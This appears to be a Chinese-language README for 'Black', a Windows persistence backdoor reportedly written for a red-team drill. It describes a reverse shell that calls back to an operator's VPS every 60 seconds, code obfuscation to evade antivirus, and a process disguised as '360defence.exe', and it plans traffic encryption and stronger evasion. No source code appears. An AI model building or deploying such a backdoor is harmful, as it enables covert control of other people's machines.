## Windows权限维持工具

#### Why:

> 起源：某次应急响应的演练中，甲方爸爸要求开发一个病毒后门来完成这次演练
>
> 要求：
>
> 1、有异常外联行为（后门）
>
> 2、有内网横向功能
>
> 3、有传播复制蠕虫
>
> （我要五彩斑斓的黑.jpg）

#### How：

进入正题，先实现功能1

正好自己也想写个权限维持的工具出来

##### **~开发思路：**

- S端通过socket管道来传输command给C端，C端执行，实现简易的后门控制
- 采用TCP socket、传输稳定，不掉包（可能会出现粘包，未做边界分离）
- 靶机为C端，公网VPS为S端，C端不断发起连接，以防掉线
- 混淆代码，初步免杀

##### ~使用方法：

> ```
> # Windows权限维持后门、持续反弹shell，60s/1次
> Black v1.0
> Usage: black.exe r_ip r_port
> author: NOVASEC_黑仔
> if cmd == quit:
>     关闭管道，临时退出
> elif cmd == exit:
>     程序结束，永久退出
> else:
>  执行命令，回显结果
> ```

##### **~使用效果：**

正常回显

![image-20210330174558324](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330174558324.png)

暂时退出、断开后，60s再次连接，继续执行命令

![image-20210330174838523](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330174838523.png)

永久退出、断开连接

![image-20210330175403279](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330175403279.png)

靶机端口及进程情况：

![image-20210330175221694](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330175221694.png)

![image-20210330175046964](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330175046964.png)

##### ~免杀情况：

![image-20210330173705993](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330173705993.png)

![image-20210330170259060](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330170259060.png)

被检测出了，建议隔离

![image-20210330170745685](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210330170745685.png)

V1.1

> 在之前的基础上
>
> 增加花指令
>
> 增加程序图标
>
> 其他不变（进程名360defence.exe，双进程）

![image-20210331232840781](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210331232840781.png)

![image-20210331232844697](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210331232844697.png)

##### **~后期规划**：

- 进行出网判断
- 流量加密
- 进阶免杀
- 等等...







